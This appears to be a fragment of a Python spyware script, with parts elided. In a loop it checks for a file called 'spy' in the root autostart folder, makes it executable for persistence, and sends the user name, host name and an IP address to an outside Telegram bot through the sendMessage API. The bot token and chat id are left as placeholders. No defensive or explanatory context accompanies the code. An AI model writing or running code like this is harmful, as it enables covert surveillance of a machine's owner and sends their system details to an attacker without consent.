...
while True :
 if os.path.exists("/root/.config/autostart/spy"):
      os.system("chmod +x root/.config/autostart/spy")
      ...
      requests.get("https://api.telegram.org/bot(token)/sendMessage?chat_id=(id)&text=spy : "+str(user)+"|"+str(host)+"|"+str(ipr) ).url   
